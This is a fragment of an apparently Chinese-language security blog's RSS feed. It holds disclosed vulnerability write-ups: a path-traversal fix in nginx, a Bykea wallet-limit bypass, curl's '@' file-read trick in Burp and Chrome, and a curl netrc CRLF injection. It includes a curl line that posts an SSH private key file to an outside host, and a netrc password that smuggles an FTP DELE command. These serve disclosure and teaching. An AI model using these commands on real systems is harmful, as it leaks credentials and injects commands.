&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nginx&#34; data-lang=&#34;nginx&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$request_uri&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;~&lt;/span&gt; &lt;span class=&#34;sr&#34;&gt;&amp;#34;\.\./&amp;#34;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;# 防止路径遍历 https://hackerone.com/reports/3181066
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kn&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;404&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;生产环境配置&#34;&gt;生产环境配置
&lt;/h2&gt;&lt;p&gt;实际生产环境中/assets/请求由Nginx处理：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nginx&#34; data-lang=&#34;nginx&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;location&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;/assets/&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kn&#34;&gt;expires&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;1M&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kn&#34;&gt;add_header&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;Cache-Control&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;public&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kn&#34;&gt;add_header&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;Service-Worker-Allowed&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kn&#34;&gt;add_header&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;Cross-Origin-Embedder-Policy&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;require-corp&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kn&#34;&gt;rewrite&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;^/assets/_\w&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;kn&#34;&gt;6}/(.+)$&amp;#34;&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;/assets/&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kn&#34;&gt;alias&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;/home/lichess-deploy/public/&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;时间线&#34;&gt;时间线
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;2025-06-06 11:16 UTC：漏洞提交&lt;/li&gt;
&lt;li&gt;2025-06-07 09:24 UTC：确认为有效漏洞&lt;/li&gt;
&lt;li&gt;2025-06-09 07:39 UTC：提出初步修复方案&lt;/li&gt;
&lt;li&gt;2025-06-09 11:30 UTC：漏洞修复完成并公开&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Bykea漏洞报告：绕过青铜合作伙伴钱包限制接受负余额行程的技术分析</title>
        <link>http://localhost:1313/p/bykea%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A%E7%BB%95%E8%BF%87%E9%9D%92%E9%93%9C%E5%90%88%E4%BD%9C%E4%BC%99%E4%BC%B4%E9%92%B1%E5%8C%85%E9%99%90%E5%88%B6%E6%8E%A5%E5%8F%97%E8%B4%9F%E4%BD%99%E9%A2%9D%E8%A1%8C%E7%A8%8B%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 07:38:37 +0800</pubDate>
        
        <guid>http://localhost:1313/p/bykea%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A%E7%BB%95%E8%BF%87%E9%9D%92%E9%93%9C%E5%90%88%E4%BD%9C%E4%BC%99%E4%BC%B4%E9%92%B1%E5%8C%85%E9%99%90%E5%88%B6%E6%8E%A5%E5%8F%97%E8%B4%9F%E4%BD%99%E9%A2%9D%E8%A1%8C%E7%A8%8B%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;漏洞技术细节&#34;&gt;漏洞技术细节
&lt;/h3&gt;&lt;p&gt;安全研究员&lt;code&gt;@bugbountywithmarco&lt;/code&gt;发现Bykea平台存在业务逻辑缺陷，允许钱包余额为负的青铜级合作伙伴绕过平台限制接受行程订单。通过串联调用三个后端API端点实现漏洞利用：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;初始请求&lt;/strong&gt;&lt;br&gt;
&lt;code&gt;GET /v2/:city_id/bookings&lt;/code&gt; 获取城市预订信息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;位置更新&lt;/strong&gt;&lt;br&gt;
&lt;code&gt;PUT /api/v2/driver/update/location&lt;/code&gt; 携带任意&lt;code&gt;trip_id&lt;/code&gt;更新司机位置&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;报价提交&lt;/strong&gt;&lt;br&gt;
&lt;code&gt;POST /api/v2/offer/bid&lt;/code&gt; 提交行程报价&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;通过这种调用链，负余额司机可重置其可用状态并成功提交报价，从而绕过钱包余额限制非法获取行程订单。&lt;/p&gt;
&lt;h3 id=&#34;时间线摘要&#34;&gt;时间线摘要
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;2024-11-27 17:43 UTC 漏洞提交&lt;/li&gt;
&lt;li&gt;2024-11-28 07:19 UTC 获得赏金&lt;/li&gt;
&lt;li&gt;初始评级8.6（高危）后调整为6.5（中危）&lt;/li&gt;
&lt;li&gt;2025-06-13 漏洞报告公开&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;技术影响&#34;&gt;技术影响
&lt;/h3&gt;&lt;p&gt;该漏洞属于&lt;strong&gt;业务逻辑错误&lt;/strong&gt;类别，暴露了三个关键问题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;端点权限校验不完善&lt;/li&gt;
&lt;li&gt;状态管理机制存在缺陷&lt;/li&gt;
&lt;li&gt;负余额检测逻辑可被绕过&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;平台最终通过增强钱包状态校验机制修复该漏洞。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>curl特性曝光Burp Suite和Google Chrome本地文件泄露漏洞</title>
        <link>http://localhost:1313/p/curl%E7%89%B9%E6%80%A7%E6%9B%9D%E5%85%89burp-suite%E5%92%8Cgoogle-chrome%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</link>
        <pubDate>Sun, 03 Aug 2025 05:15:26 +0800</pubDate>
        
        <guid>http://localhost:1313/p/curl%E7%89%B9%E6%80%A7%E6%9B%9D%E5%85%89burp-suite%E5%92%8Cgoogle-chrome%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</guid>
        <description>&lt;img src="https://portswigger.net/cms/9a8b6e0b1d8b5b5a/cover-image/research.jpg" alt="Featured image of post curl特性曝光Burp Suite和Google Chrome本地文件泄露漏洞" /&gt;&lt;p&gt;在这篇文章中，我们将探讨curl中一个鲜为人知的特性，该特性导致了Burp Suite Pro和Google Chrome的本地文件泄露漏洞。虽然我们早已为Burp Suite发布了补丁，但怀疑该技术可能对利用其他具有&amp;quot;复制为curl命令&amp;quot;功能或从命令行调用curl的应用程序有所帮助。该漏洞由Paul Mutton通过我们的漏洞赏金计划私下报告，并慷慨地允许我们发布这篇分析报告。&lt;/p&gt;
&lt;p&gt;Burp Suite用户经常构造复杂的HTTP请求来演示网站漏洞。为了更轻松地与他人共享这些概念验证漏洞利用，我们提供了&amp;quot;复制为curl命令&amp;quot;功能，可生成复制Burp Suite中请求的curl命令。&lt;/p&gt;
&lt;p&gt;例如，给定以下请求：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;POST / HTTP/1.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: portswigger.net
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Type: application/x-www-form-urlencoded
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Length: 7
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;foo=bar
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;点击&amp;quot;复制为curl命令&amp;quot;后，Burp Suite会生成以下命令并复制到剪贴板：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -i -s -k \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     -X $&amp;#39;POST&amp;#39; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     -H $&amp;#39;Host: portswigger.net&amp;#39; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     -H $&amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     -H $&amp;#39;Content-Length: 7&amp;#39; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     --data-binary $&amp;#39;foo=bar&amp;#39; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     $&amp;#39;https://portswigger.net/&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;您可以将此命令粘贴到终端中，在Burp Suite外部重新发出请求。我们非常注意转义这些数据，以避免用户因恶意请求注入额外的shell命令或任意curl参数而受到攻击。但不幸的是，存在一个更微妙的问题。您能发现吗？&lt;/p&gt;
&lt;p&gt;答案一如既往地藏在友好的手册中：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--data-binary &amp;lt;data&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;这将完全按指定方式发送数据，不进行任何额外处理。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;如果数据以字母@开头，其余部分应为文件名。
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;因此，以下命令是安全的：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl --data-binary &amp;#39;/home/albinowax/.ssh/id_rsa&amp;#39; --trace-ascii - https://02.rs/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;=&amp;gt; 发送数据，28字节(0x1c)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0000: /home/albinowax/.ssh/id_rsa
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;而这个就不那么安全了：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl --data-binary &amp;#39;@/home/albinowax/.ssh/id_rsa&amp;#39; --trace-ascii - https://02.rs/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;=&amp;gt; 发送数据，662字节(0x296)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; -----BEGIN RSA PRIVATE KEY-----
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;.b3BlbnNzaC1rZXktdjEA....
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;(不是我的真实私钥)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们在2020.5.1版本中修复了这个漏洞，如果请求体以@符号开头，就改用更新、更安全但支持较少的&amp;ndash;data-raw标志。&lt;/p&gt;
&lt;p&gt;我们很幸运，因为在Burp Suite中利用此漏洞需要相对较多的用户交互——攻击者需要诱导用户访问恶意网站，将精心设计的请求复制为curl命令，然后通过命令行执行。如果网站使用curl并带有攻击者控制的请求体，则可能产生更大的影响，因此在SSRF测试期间绝对值得关注。@文件读取行为也适用于标头，因此在允许定义自定义标头的网站上可能有用。&lt;/p&gt;
&lt;p&gt;尽管这个特性让我们(和Chrome)感到意外，但它已完全记录在案，因此我们不认为这是curl本身的漏洞。这让我想起了服务器端模板注入，在那里沙箱逃逸可能就像阅读一个被其他人忽视的手册页面一样简单。&lt;/p&gt;
&lt;p&gt;再次感谢Paul分享这个很酷的技术。下次见！&lt;/p&gt;
</description>
        </item>
        <item>
        <title>curl netrc文件CRLF注入漏洞分析</title>
        <link>http://localhost:1313/p/curl-netrc%E6%96%87%E4%BB%B6crlf%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 04:08:44 +0800</pubDate>
        
        <guid>http://localhost:1313/p/curl-netrc%E6%96%87%E4%BB%B6crlf%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;curl-netrc-crlf注入漏洞报告&#34;&gt;curl netrc crlf注入漏洞报告
&lt;/h1&gt;&lt;h2 id=&#34;摘要&#34;&gt;摘要
&lt;/h2&gt;&lt;p&gt;curl允许在netrc文件的登录和密码字段中编码CR和LF字符。当攻击者能够影响netrc文件内容时，可通过在登录名或密码中注入CRLF来实现FTP命令注入。POP3协议同样可能受影响但未经测试。&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现步骤&#34;&gt;漏洞复现步骤
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;创建包含恶意payload的netrc文件：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;machine localhost
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  login alice
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  password &amp;#34;alicespassword\r\nDELE pocfile.txt&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;启动测试用的FTP服务器：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -ne &lt;span class=&#34;s2&#34;&gt;&amp;#34;220 \r\n331 \r\n&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc -v -l -p &lt;span class=&#34;m&#34;&gt;9999&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;使用受影响curl版本发起请求：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -v --netrc-file netrc ftp://localhost:9999
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;修复建议&#34;&gt;修复建议
&lt;/h2&gt;&lt;p&gt;对于使用CR/LF作为分隔符的协议（如FTP、POP3等），在构造命令时不应允许用户名或密码中包含CR或LF字符。&lt;/p&gt;
&lt;h2 id=&#34;影响评估&#34;&gt;影响评估
&lt;/h2&gt;&lt;p&gt;可实现FTP/POP3命令注入。项目方最终认定该问题属于&amp;quot;本地攻击者已存在&amp;quot;类别，不构成安全漏洞。&lt;/p&gt;
&lt;h2 id=&#34;时间线&#34;&gt;时间线
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;2024年11月9日：漏洞报告提交&lt;/li&gt;
&lt;li&gt;2024年11月10日：curl团队确认问题性质&lt;/li&gt;
&lt;li&gt;2024年11月10日：报告关闭（标记为Not Applicable）&lt;/li&gt;
&lt;li&gt;2025年7月7日：报告公开披露&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>漏洞利用实验室：Blackhat 2016漏洞实验课程 - 课前教程与破解挑战</title>
        <link>http://localhost:1313/p/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4blackhat-2016%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C%E8%AF%BE%E7%A8%8B-%E8%AF%BE%E5%89%8D%E6%95%99%E7%A8%8B%E4%B8%8E%E7%A0%B4%E8%A7%A3%E6%8C%91%E6%88%98/</link>
        <pubDate>Sun, 03 Aug 2025 03:03:19 +0800</pubDate>
        
